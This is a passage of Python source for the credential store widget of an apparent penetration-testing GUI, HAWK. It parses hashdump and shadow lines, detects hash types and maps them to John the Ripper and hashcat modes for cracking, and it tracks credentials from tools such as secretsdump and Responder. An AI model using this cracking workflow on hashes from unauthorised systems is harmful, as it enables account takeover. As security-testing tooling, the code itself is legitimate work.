# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Credential Store Widget v1.0
- Cleartext + hash credentials
- Auto-detect hash type (LM:NTLM format handled)
- CRACK button with John/Hashcat — correct format auto-selected
- EDIT and DELETE buttons per credential
- Import from clipboard (hashdump format)
"""

import customtkinter as ctk
import re
import os
import glob
import shlex
from utils.config import COLORS
from utils.session import Credential


def _mono(size=13, bold=False):
    return ctk.CTkFont(family="Courier New", size=size,
                       weight="bold" if bold else "normal")


def needs_unverified_badge(cred) -> bool:
    """True when a row must carry the ⚠ UNVERIFIED badge.

    The single place that decides what the badge means: HAWK has not
    watched this credential authenticate.  Kept at module level so the
    rule is testable without a Tk display.
    """
    return not getattr(cred, "verified", True)


def cred_identity(cred) -> tuple:
    """Stable identity for a credential: domain-stripped username + host +
    type + secret.  Matches the duplicate-detection identity (services and
    verified state excluded) so the same credential keys the same before and
    after a store refresh.  Module level = testable without a Tk display.
    """
    user = (getattr(cred, "username", "") or "").strip().lower()
    if "\\" in user:
        user = user.split("\\", 1)[1]
    if "/" in user:
        user = user.split("/", 1)[1]
    host = (getattr(cred, "host", "") or "").strip().lower()
    secret = (getattr(cred, "hash_val", "")
              or getattr(cred, "password", "") or "").strip()
    ctype = (getattr(cred, "cred_type", "") or "").strip().lower()
    return (user, host, ctype, secret)


HASH_FORMATS_JOHN = {
    "NTLM":       "NT",
    "LM":         "LM",
    "MD5":        "raw-md5",
    "SHA1":       "raw-sha1",
    "SHA256":     "raw-sha256",
    "SHA512":     "raw-sha512",
    "NTLMv2":     "netntlmv2",
    "bcrypt":     "bcrypt",
    "md5crypt":   "md5crypt",
    "sha512crypt":"sha512crypt",
}

HASH_MODES_HASHCAT = {
    "NTLM":       1000,
    "LM":         3000,
    "MD5":        0,
    "SHA1":       100,
    "SHA256":     1400,
    "SHA512":     1700,
    "NTLMv2":     5600,
    "bcrypt":     3200,
    "md5crypt":   500,
    "sha512crypt":1800,
}


def detect_hash_type(hash_val: str) -> str:
    """Auto-detect hash type. Handles LM:NTLM format from hashdump."""
    h = hash_val.strip()
    # LM:NTLM format (hashdump output)
    if re.match(r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", h):
        return "NTLM"
    if h.startswith("$2"):       return "bcrypt"
    if h.startswith("$1$"):      return "md5crypt"
    if h.startswith("$6$"):      return "sha512crypt"
    if h.startswith("$5$"):      return "sha256crypt"
    # Modern Linux shadow defaults: yescrypt ($y$) is the current default
    # on Debian 11+/Ubuntu 22.04+/Kali/Fedora; gost-yescrypt ($gy$) and
    # scrypt ($7$) are the rarer siblings.  hashcat has no yescrypt mode,
    # so these crack via FAST (john autodetects the $-prefixed format).
    if h.startswith("$y$"):      return "yescrypt"
    if h.startswith("$gy$"):     return "gost-yescrypt"
    if h.startswith("$7$"):      return "scrypt"
    if h.startswith("$NTLMv2$"): return "NTLMv2"
    # Kerberoast / AS-REP roast tickets — keep these keys identical to the
    # ones the GetUserSPNs / GetNPUsers parsers set, so the crack strategy
    # maps (_JOHN_FORMAT / _HASHCAT_MODE) resolve for pasted hashes too.
    if h.startswith("$krb5tgs$"):   return "Kerberos TGS"
    if h.startswith("$krb5asrep$"): return "Kerberos AS-REP"
    if h.startswith("$DCC2$"):      return "DCC2"
    if re.match(r"^[a-fA-F0-9]{32}$", h):  return "NTLM"
    if re.match(r"^[a-fA-F0-9]{40}$", h):  return "SHA1"
    if re.match(r"^[a-fA-F0-9]{64}$", h):  return "SHA256"
    if re.match(r"^[a-fA-F0-9]{128}$", h): return "SHA512"
    return "Unknown"


def extract_ntlm(hash_val: str) -> str:
    """Extract NTLM part from LM:NTLM format."""
    if re.match(r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", hash_val.strip()):
        return hash_val.strip().split(":")[1]
    return hash_val.strip()


# Pre-compiled regexes used by split_username_hash().
# Each one describes a pasted-line format that embeds the username next
# to the hash — so we can yank out the username and hand john just the
# hash, while still pairing the cracked password with the right user.
_RE_PWDUMP = re.compile(
    r"^([^:\s]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::")
_RE_SHADOW = re.compile(
    r"^([^:\s]+):(\$[0-9a-zy]{1,3}\$[^:\s]+)")
_LM_EMPTY  = "aad3b435b51404eeaad3b435b51404ee"


def split_username_hash(raw: str):
    """Parse a pasted credential line into (username, hash, hash_type).

    Any of the three may be None / empty if we can't tell.

    Formats recognised (in order of specificity):
      • pwdump / hashdump:   user:RID:LM:NT:::          → (user, 'LM:NT' or NT, 'NTLM')
      • Linux shadow:        user:$algo$salt$hash:...   → (user, '$algo$salt$hash', 'md5crypt'|'sha512crypt'|'bcrypt'…)
      • user:hash pair:      user:<hashlike>            → (user, hash, detected-type)
      • user:cleartext:      user:<non-hash>            → (user, value, 'Unknown')  — caller may treat as cleartext
      • bare hash:           <hash>                     → (None, hash, detected-type)
      • fallback multi-field (salvage pwdumps with odd spacing)

    The rationale: the user pastes something, HAWK shouldn't drop the
    username on the floor. Before this helper, ADD / IMPORT / CRACK each
    had their own partial parser — shadow and bare-hash were not handled,
    which is why cracked results sometimes ended up orphaned.
    """
    line = (raw or "").strip()
    if not line:
        return None, "", ""

    # 1) pwdump / hashdump — most specific, check first
    m = _RE_PWDUMP.match(line)
    if m:
        u, _rid, lm, nt = m.group(1), m.group(2), m.group(3), m.group(4)
        h = nt if lm.lower() == _LM_EMPTY else f"{lm}:{nt}"
        return u, h, "NTLM"

    # 2) Linux shadow / modcrypt ($1$ md5crypt, $5$ sha256crypt,
    #    $6$ sha512crypt, $2a$/$2b$/$2y$ bcrypt, $y$ yescrypt, …)
    m = _RE_SHADOW.match(line)
    if m:
        u, h = m.group(1), m.group(2)
        return u, h, detect_hash_type(h)

    parts = line.split(":")

    # 3) Exactly two fields: user:hash (or user:cleartext-password)
    if len(parts) == 2:
        u, v = parts
        ht = detect_hash_type(v)
        # Preserve username regardless — caller decides hash vs cleartext
        # based on whether ht is "Unknown".
        return u, v, ht

    # 4) Bare token: just a hash, no colons
    if len(parts) == 1:
        ht = detect_hash_type(line)
        if ht != "Unknown":
            return None, line, ht
        return None, line, "Unknown"

    # 5) Salvage path for pwdump-like lines that don't match _RE_PWDUMP
    #    (e.g. missing the trailing ':::' or a weird RID field). Fall back
    #    to the old heuristic: first field = user, last non-empty = NTLM,
    #    second-to-last = LM if it looks like an NT-style hash.
    clean = [p for p in parts if p.strip()]
    if len(clean) >= 3:
        u = parts[0]
        cand = clean[-1]
        if detect_hash_type(cand) == "NTLM":
            lm = clean[-2]
            if detect_hash_type(lm) == "NTLM":
                h = cand if lm.lower() == _LM_EMPTY else f"{lm}:{cand}"
            else:
                h = cand
            return u, h, "NTLM"

    # Couldn't classify — hand the whole thing back as an opaque hash
    return None, line, "Unknown"


class CredentialStoreWidget(ctk.CTkFrame):

    def __init__(self, parent, app, **kwargs):
        super().__init__(parent,
            fg_color=COLORS["bg_secondary"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=4, **kwargs)
        self.app = app
        # ── Tab-blink state (same pattern as TargetIntelWidget) ──
        self._tab_label      = None
        self._tab_base_text  = "CREDENTIAL STORE"
        self._blink_active   = False
        self._blink_count    = 0
        self._new_findings   = 0
        # Identities of credentials captured since the operator last viewed
        # this tab.  A fresh capture (e.g. a Responder NetNTLMv2 hash) lands
        # UNVERIFIED in AD RESULTS; the tab shows "(N new)" but the ROW was
        # not marked, so the operator could miss it (MSF3 B4.4).  Rows whose
        # identity is in this set are highlighted; cleared on tab view.
        self._new_cred_keys: set = set()
        # ── Active-crack registry ────────────────────────────────────
        # credential.id → {"runner": CrackRunner, "strategy": "FAST" |
        #        "RULE-BASED" | "HYBRID" | "TARGET" | "MASK" | "FULL STACK"}
        # Keyed by the credential's STABLE id, not its list position: a
        # crack can run for minutes and the operator may delete another
        # row in the meantime, sliding every index — the id is the only
        # handle that still points at the credential that started it.
        # Populated by _register_crack() the moment a run starts,
        # drained by _unregister_crack() from the runner's done
        # callback OR by _stop_crack_on_row() when the user clicks the
        # red STOP on the credential row.  The render pipeline swaps
        # the yellow 🔓 CRACK button for a red ⏹ STOP button on any
        # row whose id is in this dict.
        #
        # HAWK enforces "one crack at a time" (see _has_active_crack)
        # to keep the VM responsive — rationale: running multiple
        # hashcat / john processes in parallel on a CPU-only VM pegs
        # every core and starves the UI thread; serialising them keeps
        # HAWK clickable throughout long cracks.
        self._active_cracks: dict = {}
        self._build_ui()

    def set_tab_label(self, widget):
        """Store a reference to the CTkRadioButton used as tab header."""
        self._tab_label = widget

    # ─── Active-crack registry helpers ──────────────────────────────────
    #
    # Every local crack (FAST / RULE-BASED / HYBRID / TARGET / MASK /
    # FULL STACK) registers its CrackRunner here the moment the thread
    # starts, and unregisters from the runner's done_callback.  The
    # registry drives two user-visible behaviours:
    #
    #   1. "One crack at a time" — _has_active_crack() gates entry into
    #      the strategy picker; clicking 🔓 CRACK on a second row while
    #      another is running pops a non-blocking info dialog telling
    #      the user to stop the first one.
    #
    #   2. Per-row STOP button — the row builder checks
    #      `cred.id in self._active_cracks` and renders a red ⏹ STOP in
    #      place of the yellow 🔓 CRACK, wired to _stop_crack_on_row.
    #      This fixes the "CLOSE on the progress dialog orphans the
    #      crack with no way to stop it" trap.

    def _has_active_crack(self) -> bool:
        """True if any credential row currently owns a running crack."""
        return bool(self._active_cracks)

    def _active_crack_id(self):
        """Return the credential id of the running crack, or None."""
        if not self._active_cracks:
            return None
        return next(iter(self._active_cracks.keys()))

    def _register_crack(self, cred_id: str, runner, strategy: str) -> None:
        """Record an active crack and repaint so the row shows STOP.

        Keyed by the credential's stable id, not its list position: the
        crack outlives the row it was launched from (the user can delete
        another credential and shift every index while hashcat chews),
        and STOP / done must still find the exact credential that started
        it."""
        self._active_cracks[cred_id] = {
            "runner":   runner,
            "strategy": strategy,
        }
        try:
            self.refresh()
        except Exception:
            pass

    def _unregister_crack(self, cred_id: str) -> None:
        """Clear the active-crack slot and repaint.  Safe to call more
        than once (idempotent) — the done_callback and the STOP button
        can race and both end up here."""
        self._active_cracks.pop(cred_id, None)
        try:
            self.refresh()
        except Exception:
            pass

    def _stop_crack_on_row(self, cred_id: str) -> None:
        """User clicked ⏹ STOP on a row.  Kill the subprocess; the
        done_callback will fire shortly (SIGTERM → 2s → SIGKILL) and
        trigger _unregister_crack().  We ALSO unregister right away so
        the UI feels responsive — re-registering a moment later is
        harmless because the done_callback's unregister is idempotent."""
        entry = self._active_cracks.get(cred_id)
        if not entry:
            return
        runner = entry.get("runner")
        strategy = entry.get("strategy", "?")
        try:
            self.app.terminal.write(
                f"  [*] Stopping {strategy} crack...",
                "warn")
        except Exception:
            pass
        if runner is not None:
            try:
                runner.kill()
            except Exception as e:
                print(f"[HAWK] runner.kill() failed: {e}")
        # Eager unregister — better UX than waiting ~2 s for SIGKILL
        # escalation to close the loop through done_callback.
        self._unregister_crack(cred_id)

    def stop_all_active_cracks(self) -> None:
        """Teardown hook — called from app._on_close.  Kills every
        live crack best-effort so HAWK doesn't leave zombie john /
        hashcat processes running after the window closes."""
        if not self._active_cracks:
            return
        # Copy the keys first because _unregister_crack mutates the dict.
        for cred_id in list(self._active_cracks.keys()):
            entry = self._active_cracks.get(cred_id)
            if not entry:
                continue
            runner = entry.get("runner")
            if runner is not None:
                try:
                    runner.kill()
                except Exception:
                    pass
        self._active_cracks.clear()

    def _show_one_at_a_time_notice(self) -> None:
        """Non-blocking info popup shown when the user clicks CRACK on
        a second credential while one is already running."""
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                   _btn_row, _btn, _safe_destroy)
        active_id = self._active_crack_id()
        active_strategy = "?"
        if active_id is not None:
            active_strategy = (
                self._active_cracks.get(active_id, {})
                .get("strategy", "?"))
        win = _make_win(self, "One crack at a time", 560, 320)
        _title(win, "⚠  One crack at a time")
        _sub(win,
              "HAWK runs a single crack at a time to keep the VM "
              "responsive.",
              COLORS["text_dim"])
        _note_box(
            win,
            f"A {active_strategy} crack is already running on another "
            f"credential.\n\n"
            "Running one crack at a time lets the app and the VM's "
            "hardware work at their best — parallel cracks peg every "
            "core and starve the UI thread.\n\n"
            "Press ⏹ STOP on that credential's row first, then retry.",
            COLORS["text_yellow"])
        row = _btn_row(win)
        _btn(row, "OK", lambda: _safe_destroy(win), primary=True, w=120)

    def _build_ui(self):
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)

        hdr = ctk.CTkFrame(self, fg_color=COLORS["bg_header"],
                           height=32, corner_radius=0)
        hdr.grid(row=0, column=0, sticky="ew", padx=1, pady=(1,0))
        hdr.grid_columnconfigure(0, weight=1)
        hdr.grid_propagate(False)

        ctk.CTkLabel(hdr, text="  CREDENTIAL STORE",
                     font=_mono(13, True), text_color=COLORS["text_dim"],
                     anchor="w").grid(row=0, column=0, sticky="w", padx=8, pady=4)

        bf = ctk.CTkFrame(hdr, fg_color="transparent")
        bf.grid(row=0, column=1, sticky="e", padx=6)

        for text, color, cmd in [
            ("ADD",    COLORS["border_green"], self._add_manual),
            ("IMPORT", COLORS["border_amber"], self._import_clipboard),
        ]:
            ctk.CTkButton(bf, text=text, width=60, height=22,
                font=_mono(11), fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=color, border_width=1,
                text_color=color, corner_radius=2,
                command=cmd).pack(side="left", padx=2)

        self._scroll = ctk.CTkScrollableFrame(self,
            fg_color=COLORS["bg_card"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"],
            corner_radius=0)
        self._scroll.grid(row=1, column=0, sticky="nsew", padx=1, pady=(0,1))
        self._scroll.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(self._scroll,
            text="No credentials found.\nRun Hydra or MSF to populate,\nor click ADD.",
            font=_mono(12), text_color=COLORS["text_muted"],
            justify="center").grid(row=0, column=0, pady=20)

    # ─── Public API ──────────────────────────────────────────────────────────

    def refresh(self):
        if not self.app.session_manager.current:
            return
        # One-shot cleanup: HAWK used to store anonymous logins with an
        # empty password, which made the Edit dialog look blank.  If any
        # such legacy entries are present in this session, upgrade them
        # in-place so the user sees "anonymous / anonymous" as expected.
        self._upgrade_legacy_anonymous_creds()
        self._render_creds(self.app.session_manager.current.get_credentials())

    def _upgrade_legacy_anonymous_creds(self):
        try:
            sess = self.app.session_manager.current
            if not sess:
                return
            changed = False
            for entry in sess.credentials:   # list of raw dicts
                if ((entry.get("username") or "").lower() == "anonymous"
                        and entry.get("cred_type", "cleartext") == "cleartext"
                        and not (entry.get("password") or "").strip()):
                    entry["password"] = "anonymous"
                    changed = True
            if changed:
                sess._touch()
                sess.save()
        except Exception:
            pass

    def _find_duplicate_index(self, cred: Credential) -> int:
        """Return the index of an equivalent credential in
        ``session.credentials`` or -1 when none exists.

        Match criteria: same username (case-insensitive, domain
        prefix stripped) + same host + same secret (password for
        cleartext, hash_val for hash).  Service list is NOT part
        of the match — two creds with identical identity but
        different ``services`` are still considered the SAME
        credential.  ``add_credential`` then merges the new
        services into the existing entry (cf. STEP 6 / Pkg A).

        Domain-prefix stripping fixes a long-standing bug with
        impacket-secretsdump output: it dumps the SAME user TWICE
        (once from local SAM as "Administrator", once from DRSUAPI
        / NTDS.DIT as "DOMAIN\\Administrator"), with identical
        hashes but different username strings.  The naive case-only
        check let both through; user ended up with two identical-
        looking rows for the same account, and cracking the second
        silently appeared to do nothing because mark_cracked
        targeted the wrong row index.  Stripping the leading
        "DOMAIN\\" or "DOMAIN/" makes both forms collapse to the
        same key.
        """
        if not self.app.session_manager.current:
            return -1
        existing = self.app.session_manager.current.get_credentials()

        def _strip_domain(u: str) -> str:
            # "METASPLOITABLE\\Administrator" → "administrator"
            # "metasploitable.lab/admin"      → "admin"
            # "Administrator"                 → "administrator"
            u = (u or "").strip().lower()
            if "\\" in u:
                u = u.split("\\", 1)[1]
            if "/" in u:
                u = u.split("/", 1)[1]
            return u

        u_new = _strip_domain(cred.username)
        h_new = (cred.host or "").lower()
        for idx, c in enumerate(existing):
            if _strip_domain(c.username) != u_new:
                continue
            if (c.host or "").lower() != h_new:
                continue
            # Same identity — compare the secret value.
            if cred.cred_type == "hash":
                if c.cred_type == "hash" and c.hash_val == cred.hash_val:
                    return idx
            else:
                if c.password == cred.password:
                    return idx
        return -1

    def _is_duplicate(self, cred: Credential) -> bool:
        """Back-compat shim around _find_duplicate_index().

        Returns True iff an equivalent credential already exists.
        Kept so any external callers (smoke tests, AD path) that
        still pre-check via `_is_duplicate(cred)` keep working
        without modification.
        """
        return self._find_duplicate_index(cred) >= 0

    def add_credential(self, cred: Credential):
        if not self.app.session_manager.current:
            return
        # Upgrade legacy anonymous entries first — otherwise a fresh
        # "anonymous / anonymous" credential would be treated as distinct
        # from an old "anonymous / <empty>" one and both would stack up.
        self._upgrade_legacy_anonymous_creds()
        # Normalise the INCOMING anonymous/guest cred too: some call-sites
        # (SMB null-session, rpcclient) send password="" while others
        # (FTP, LDAP) send password="anonymous". Without this the legacy
        # upgrade promotes existing rows to "anonymous" but the new entry
        # stays "", so _is_duplicate never matches and the same anon
        # login stacks up on every Connect re-run.
        if (cred.cred_type == "cleartext"
                and (cred.username or "").strip().lower() in ("anonymous", "guest")
                and not (cred.password or "").strip()):
            cred.password = cred.username.strip().lower()

        # ── STEP 6 / Pkg A — per-service merge ──────────────────────
        # Locate any existing entry with the same (user, host, secret)
        # identity.  When found, MERGE the new entry's services + notes
        # into the existing row instead of dropping the new cred on the
        # floor.  This is what makes the per-service verified badge
        # work: the same msfadmin:msfadmin gets ONE row with
        # services=[SSH, TELNET, FTP, ...] as Hydra / Connect / netexec
        # validate it across protocols.
        sess = self.app.session_manager.current
        dup_idx = self._find_duplicate_index(cred)
        if dup_idx >= 0:
            existing = sess.credentials[dup_idx]
            # Build the new services union — case-insensitive dedup,
            # preserve first-seen order so the visual badge order in
            # the row stays stable across re-runs.
            old_svcs = list(existing.get("services") or [])
            new_svcs = list(cred.services or [])
            seen_low = {(s or "").strip().lower() for s in old_svcs
                        if (s or "").strip()}
            added = []
            for s in new_svcs:
                key = (s or "").strip().lower()
                if not key or key in seen_low:
                    continue
                seen_low.add(key)
                added.append(s)

            # Track what genuinely changed.  Even when `added==[]` we
            # may still need to UPGRADE the existing row when the new
            # cred carries a verified/cracked/notes signal that the
            # existing row lacks (e.g. an old save-on-launch row that
            # Hydra later validates → verified flips False→True).
            changed = False

            if added:
                existing["services"] = old_svcs + added
                changed = True

            # Notes: append when non-empty and not already a substring
            # of the existing notes (substring dedup avoids piling up
            # near-identical phrases).
            new_notes = (cred.notes or "").strip()
            if new_notes:
                old_notes = (existing.get("notes") or "").strip()
                if new_notes not in old_notes:
                    existing["notes"] = (
                        f"{old_notes}\n{new_notes}".strip()
                        if old_notes else new_notes)
                    changed = True

            # Union of verified flags — verified=True if EITHER row
            # was verified.  Strict no-downgrade: an already-verified
            # row never reverts to unverified.  The getattr default is
            # False so a cred that carries no proof can never promote
            # an existing row (re-importing the same unverified cred
            # must NOT make it look verified).
            if getattr(cred, "verified", False) and \
                    not existing.get("verified", True):
                existing["verified"] = True
                changed = True

            # cracked flag union — same no-downgrade logic.  Preserve
            # cracked_pass when the new entry carries it.
            if getattr(cred, "cracked", False):
                if not existing.get("cracked"):
                    existing["cracked"] = True
                    changed = True
                if (getattr(cred, "cracked_pass", "")
                        and not existing.get("cracked_pass")):
                    existing["cracked_pass"] = cred.cracked_pass
                    changed = True

            if not changed:
                # Truly identical (same identity AND same services AND
                # nothing new in notes / verified / cracked) — silent
                # no-op, the legacy contract.
                return

            sess._touch()
            sess.save()
            self.refresh()
            # Terminal feedback.  Two variants:
            #   • New services landed → list them ("merged: [+TELNET]")
            #   • Only flags/notes changed → generic "updated"
            if added:
                msg = (f"  ↗  Credential merged: {cred.username}  "
                       f"[+{', '.join(added)}]")
            else:
                msg = (f"  ↗  Credential updated: {cred.username}  "
                       f"({', '.join(old_svcs) or 'no svc'})")
            self.app.terminal.write(msg, "finding")
            self._blink_start()
            return

        # No existing match → brand-new entry.  Remember its identity so the
        # ROW is highlighted as new (not just the tab counter) until the
        # operator views the store (MSF3 B4.4).
        sess.add_credential(cred)
        sess.save()
        self._new_cred_keys.add(cred_identity(cred))
        self.refresh()
        _lbl = (cred.password or cred.hash_type
                or ("SSH key" if (getattr(cred, "cred_type", "") or "").lower()
                    == "key" else "hash"))
        self.app.terminal.write(
            f"  ↗  Credential: {cred.username}  [{_lbl}]",
            "finding")
        self._blink_start()

    def mark_captured(self, cred):
        """Register a credential that was pushed straight onto the session
        (bypassing this widget's add_credential — e.g. a Responder NetNTLMv2
        capture) as NEW, blink the tab counter, and re-render so the row is
        highlighted.  Without this such a capture updated the list silently
        and only the tab counter moved (MSF3 B4.4)."""
        try:
            self._new_cred_keys.add(cred_identity(cred))
        except Exception:
            pass
        self._blink_start()
        self.refresh()

    # ─── Tab blink (mirrors TargetIntelWidget) ──────────────────────────────

    def _blink_start(self):
        if not self._tab_label:
            return
        self._new_findings += 1
        try:
            badge = f"{self._tab_base_text}  ({self._new_findings} new)"
            self._tab_label.configure(text=badge)
        except Exception:
            pass
        if self._blink_active:
            self._blink_count = 0
            return
        self._blink_active = True
        self._blink_count  = 0
        self._blink_tick()

    def _blink_tick(self):
        if not self._blink_active or self._blink_count >= 24:
            self._blink_active = False
            if self._tab_label and self._tab_label.winfo_exists():
                try:
                    self._tab_label.configure(
                        text_color=COLORS.get("tab_blink", "#00FFFF"))
                except Exception:
                    pass
            return
        if not self._tab_label or not self._tab_label.winfo_exists():
            return
        color = ("#FF4444" if self._blink_count % 2 == 0
                 else COLORS.get("tab_blink", "#00FFFF"))
        try:
            self._tab_label.configure(text_color=color)
        except Exception:
            pass
        self._blink_count += 1
        self.after(320, self._blink_tick)

    def _blink_stop(self):
        self._blink_active = False
        self._new_findings = 0
        # The operator is now looking at the store: the rows have been
        # rendered (app switches the tab -> refresh() -> _blink_stop()), so
        # clearing the new-set here means the highlight fades on the NEXT
        # render instead of persisting forever.
        self._new_cred_keys = set()
        if self._tab_label and self._tab_label.winfo_exists():
            try:
                self._tab_label.configure(
                    text=self._tab_base_text,
                    text_color=COLORS["text_green"])
            except Exception:
                pass

    # ─── Render ──────────────────────────────────────────────────────────────

    def _render_creds(self, creds):
        for w in self._scroll.winfo_children():
            w.destroy()
        if not creds:
            ctk.CTkLabel(self._scroll,
                text="No credentials found.",
                font=_mono(12), text_color=COLORS["text_muted"]
                ).grid(row=0, column=0, pady=20)
            return

        # Split creds into two groups: regular creds (category "" or
        # anything non-ad_result) first, then a dedicated "AD RESULTS"
        # section below for creds produced by AD-pentesting tool
        # parsers.  Both sections use the same row builder; only the
        # header between them changes.  The split is stable so a
        # second run of the same tool lands in the same section.
        try:
            from utils.run_id import TOOL_RUN_CATEGORY
        except Exception:
            TOOL_RUN_CATEGORY = "ad_result"

        # IMPORTANT: split into (regular, ad_results) but KEEP each
        # cred's REAL index in session.credentials[].  The previous
        # implementation passed the UI grid row as the cred index,
        # which broke mark_cracked / delete / edit on every row in
        # the AD RESULTS section: clicking CRACK on the 2nd
        # AD-Results entry sent idx=N+1 (the UI grid row) to
        # mark_cracked, which then mutated session.credentials[N+1]
        # — possibly a DIFFERENT credential.  User-visible symptom:
        # cracking succeeds but the cleartext never appears on the
        # row that was clicked.  Fix: enumerate `creds` once with
        # the real index, then bucket each (real_idx, cred) pair
        # into the right section.
        regular: list[tuple[int, Credential]] = []
        ad_results: list[tuple[int, Credential]] = []
        for real_idx, c in enumerate(creds):
            if getattr(c, "category", "") == TOOL_RUN_CATEGORY:
                ad_results.append((real_idx, c))
            else:
                regular.append((real_idx, c))

        # Track cred → row widget so scroll_to_run_id can highlight
        # the right card.  Reset on every render.
        self._cred_row_by_runid = {}

        grid_row = 0
        if regular:
            for real_idx, cred in regular:
                self._build_cred_row(cred, real_idx,
                                       grid_row=grid_row)
                grid_row += 1
        if ad_results:
            # Separator / header for the AD RESULTS section.  Green
            # border so the user immediately sees where the AD-tool
            # outputs were funneled.
            hdr = ctk.CTkFrame(
                self._scroll, fg_color=COLORS["bg_header"],
                border_color=COLORS["border_green"],
                border_width=1, corner_radius=3)
            hdr.grid(row=grid_row, column=0, sticky="ew", padx=4,
                     pady=(10, 2))
            ctk.CTkLabel(
                hdr,
                text=(f"  ⚔  AD RESULTS  —  {len(ad_results)} "
                      f"entry/entries from AD pentesting tools"),
                font=_mono(12, True),
                text_color=COLORS["text_green"],
                anchor="w",
            ).pack(fill="x", padx=8, pady=4)
            grid_row += 1
            for real_idx, cred in ad_results:
                self._build_cred_row(cred, real_idx,
                                       grid_row=grid_row)
                grid_row += 1

    def scroll_to_run_id(self, run_id: str) -> None:
        """Called from app.navigate_to_run_id() — locate the first
        credential whose linked_run_id matches and scroll + highlight
        it.  Mirror of TargetIntelWidget.scroll_to_run_id for the
        reverse direction (finding → cred)."""
        if not run_id:
            return
        fr = (self._cred_row_by_runid or {}).get(run_id)
        if fr is None or not fr.winfo_exists():
            try:
                self.app.terminal.write(
                    f"  [*] No credential with run_id={run_id}",
                    "dim")
            except Exception:
                pass
            return
        try:
            parent_canvas = getattr(self._scroll,
                                    "_parent_canvas", None)
            if parent_canvas is not None:
                # Same absolute-y computation as
                # TargetIntelWidget.scroll_to_run_id — widget's
                # winfo_y() is relative to its immediate parent which
                # may be nested several levels deep inside the canvas
                # content.  We use screen coordinates to find the
                # viewport-relative offset, then add the current
                # scroll position for the absolute content-space y.
                fr.update_idletasks()
                parent_canvas.update_idletasks()
                bbox = parent_canvas.bbox("all")
                if bbox:
                    total = max(bbox[3] - bbox[1], 1)
                    top_frac, _ = parent_canvas.yview()
                    current_px = top_frac * total
                    widget_root_y = fr.winfo_rooty()
                    canvas_root_y = parent_canvas.winfo_rooty()
                    rel_viewport_y = widget_root_y - canvas_root_y
                    abs_y = current_px + rel_viewport_y
                    target_px = max(0, abs_y - 20)
                    parent_canvas.yview_moveto(target_px / total)
            orig_border = fr.cget("border_color")
            orig_width  = fr.cget("border_width")
            fr.configure(border_color=COLORS["text_green"],
                          border_width=3)
            def _revert():
                try:
                    if fr.winfo_exists():
                        fr.configure(border_color=orig_border,
                                      border_width=orig_width)
                except Exception:
                    pass
            self.after(1200, _revert)
        except Exception:
            pass

    def _build_cred_row(self, cred, idx, grid_row=None):
        """Build one credential row.

        `idx`       — REAL index into session.credentials[].  Passed
                       to action lambdas (CRACK / EDIT / DELETE /
                       USE) so they target the right credential
                       even when the UI splits creds into multiple
                       sections (AD RESULTS) with a header in
                       between that consumes a grid row.
        `grid_row`  — the row position inside the scroll's grid.
                       Defaults to `idx` for back-compat with the
                       single legacy call site that doesn't split.
        """
        if grid_row is None:
            grid_row = idx
        # Freshly captured (since last tab view) rows get a cyan border so
        # the operator spots the new credential in the list, not just via the
        # tab counter (MSF3 B4.4).
        is_new = cred_identity(cred) in (self._new_cred_keys or set())
        row = ctk.CTkFrame(self._scroll,
            fg_color=COLORS["bg_secondary"],
            border_color=(COLORS.get("tab_blink", "#00FFFF") if is_new
                          else COLORS["border_dim"]),
            border_width=2 if is_new else 1, corner_radius=3)
        row.grid(row=grid_row, column=0, sticky="ew", padx=4, pady=2)
        row.grid_columnconfigure(2, weight=1)

        # Register this row in the run-id → widget map so
        # scroll_to_run_id() can find + highlight it later.
        rid = getattr(cred, "linked_run_id", "") or ""
        if rid:
            if not hasattr(self, "_cred_row_by_runid") or \
                    self._cred_row_by_runid is None:
                self._cred_row_by_runid = {}
            # If multiple creds share a run_id (e.g. secretsdump dumps
            # 50 hashes under one run), we register the FIRST for the
            # jump target — the user can scroll from there.
            self._cred_row_by_runid.setdefault(rid, row)

        # Main info row
        if cred.cred_type == "hash":
            self._build_hash_row(row, cred, idx)
        else:
            self._build_cleartext_row(row, cred, idx)

        # Action buttons row
        act = ctk.CTkFrame(row, fg_color="transparent")
        act.grid(row=1, column=0, columnspan=5, sticky="w", padx=8, pady=(0,4))

        # Service tags — STEP 6 / Pkg A: rendered slightly more
        # visible than before (text_dim + bold instead of text_muted
        # regular) so the operator sees at a glance which services
        # a single merged credential has been validated on.  Each
        # service entry in cred.services gets its own chip — when
        # the same cred works on SSH + TELNET + FTP, the row shows
        # all three tags side by side instead of just the first.
        for svc in cred.services:
            ctk.CTkLabel(act, text=f" {svc} ",
                font=_mono(10, True),
                fg_color=COLORS["bg_card"],
                text_color=COLORS["text_dim"],
                corner_radius=2,
                ).pack(side="left", padx=2)

        ctk.CTkLabel(act, text=f"  phase: {cred.source_phase}",
            font=_mono(10), text_color=COLORS["text_muted"]
            ).pack(side="left", padx=4)

        if is_new:
            ctk.CTkLabel(act, text=" ● NEW ",
                font=_mono(10, True),
                fg_color=COLORS.get("bg_card", "#0B0F14"),
                text_color=COLORS.get("tab_blink", "#00FFFF"),
                corner_radius=2,
            ).pack(side="left", padx=4)

        if needs_unverified_badge(cred):
            ctk.CTkLabel(act, text=" ⚠ UNVERIFIED ",
                font=_mono(10, True),
                fg_color="#3A2A00",
                text_color=COLORS["text_yellow"],
                corner_radius=2,
            ).pack(side="left", padx=4)

        # Edit button
        ctk.CTkButton(act, text="✎ EDIT",
            width=60, height=18, font=_mono(10),
            fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_dim"], border_width=1,
            text_color=COLORS["text_dim"], corner_radius=2,
